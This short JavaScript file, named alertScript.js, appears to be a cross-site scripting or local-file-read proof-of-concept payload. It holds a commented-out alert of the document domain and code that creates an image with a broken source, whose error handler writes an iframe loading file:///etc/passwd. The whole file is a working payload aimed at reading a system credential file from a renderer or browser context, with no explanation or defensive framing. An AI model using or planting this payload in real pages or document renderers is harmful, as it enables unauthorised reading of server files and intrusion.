// File: alertScript.js

//alert(document.domain);

// Example JavaScript code in your .js file
var img = document.createElement('img');
img.src = 'echopwn';
img.onerror = function() {
    document.write('<iframe src="file:///etc/passwd"></iframe>');
};
document.body.appendChild(img);


